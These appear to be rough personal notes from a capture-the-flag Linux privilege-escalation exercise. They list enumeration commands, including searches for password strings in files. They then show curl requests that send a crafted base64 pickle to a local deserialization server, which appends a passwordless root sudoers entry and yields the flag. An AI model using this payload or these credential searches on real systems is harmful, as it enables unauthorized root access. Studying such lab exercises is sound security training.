# 9c550d

## LINUX PRIVILEGE ESCALATION CHECKLIST
### SYSTEM INFORMATION
1. Get OS information:
2. Check the path
3. Check the env variables, any sensitive detail
4. Search for kernel exploits such as DirtyCow
5. Check if the sudo version is vulnerable
6. Dmesg signature verification failed
7. More system enum.



1. Basic system enumeration -> at this point we discover the vulnerability, in this case it is a server local in python that is listening and has a 

uname -a 
hostname 
lscpu 
ls /home 
ls /var/www/html 
ls /var/www/
ps aux | grep root 
netstat -tulpn 
ps -aux | grep root | grep mysql
ifconfig 
find . -type f -exec grep -i -I "PASSWORD=" {} /dev/null \;
locate pass | more

https://github.com/gurkylee/Linux-Privilege-Escalation-Basics


curl http://127.0.0.1:8000/
{
    "404": "The API call you tried to make was not defined. Here's a definition of the API to help you get going :)",
    "documentation": {
        "overview": "Python server that deserializes python pickles.",
        "handlers": {
            "/deserialize": {
                "GET": {
                    "usage": "\n    Deserialize a base64 encoded python pickle.\n\n    The system auto-restarted every 15 minutes.\n    ",
                    "outputs": {
                        "format": "JSON (Javascript Serialized Object Notation)",
                        "content_type": "application/json; charset=utf-8",
                        "type": "dict() -> new empty dictionary\ndict(mapping) -> new dictionary initialized from a mapping object's\n    (key, value) pairs\ndict(iterable) -> new dictionary initialized as if via:\n    d = {}\n    for k, v in iterable:\n        d[k] = v\ndict(**kwargs) -> new dictionary initialized with the name=value pairs\n    in the keyword argument list.  For example:  dict(one=1, two=2)"
                    },
                    "inputs": {
                        "data": {
                            "type": "Basic text / string value"
                        }
                    }
                }
            }
        }
    }
}

If we send a pickle to this api, we will be able to execute a command with root accesses.

curl "http://127.0.0.1:8000/deserialize?data=gASVVgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDtlY2hvICJyaWNoYXJkX2dpbGwgQUxMPShBTEwpIE5PUEFTU1dEOiBBTEwiID4+IC9ldGMvc3Vkb2Vyc5SFlFKULg=="

curl -G --data-urlencode "data=gASVVgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDtlY2hvICJyaWNoYXJkX2dpbGwgQUxMPShBTEwpIE5PUEFTU1dEOiBBTEwiID4+IC9ldGMvc3Vkb2Vyc5SFlFKULg==" http://127.0.0.1:8000/deserialize

curl -G --data-urlencode "data=gASVVgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDtlY2hvICJyaWNoYXJkX2dpbGwgQUxMPShBTEwpIE5PUEFTU1dEOiBBTEwiID4+IC9ldGMvc3Vkb2Vyc5SFlFKULg==" http://127.0.0.1:8000/deserialize
 
Now at this point you get root access and if you go to the root you will find the flag:
	flag{9c550d9623e1ebdf2a878b07ac437bff4508663a2e2f69}.jpg

